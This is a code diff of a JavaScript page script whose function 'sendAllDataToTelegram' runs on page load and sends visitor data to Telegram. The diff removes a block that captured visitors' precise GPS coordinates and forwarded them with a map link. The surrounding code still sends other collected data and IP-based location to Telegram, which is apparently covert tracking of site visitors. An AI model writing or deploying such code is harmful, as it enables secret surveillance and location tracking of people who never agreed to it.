@@ -257,29 +257,7 @@ async function sendAllDataToTelegram() {
     // Send all messages at once through serverless function
     await sendToTelegram([msg1, msg2, msg3]);
 
-    // Request GPS
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(async function (position) {
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
-            var accuracy = position.coords.accuracy;
-
-            var gpsMsg = "<b>GPS COORDINATES:</b>\n" +
-                "====================\n\n" +
-                "Latitude: <code>" + lat + "</code>\n" +
-                "Longitude: <code>" + lon + "</code>\n" +
-                "Accuracy: " + Math.round(accuracy) + " meters\n\n" +
-                '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '">View on Google Maps</a>';
-
-            await sendToTelegram([gpsMsg]);
-        }, function () {
-            // GPS permission denied - do nothing
-        }, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        });
-    }
+    // GPS permission removed - only sends available IP-based location data
 }
 
 // Run on page load
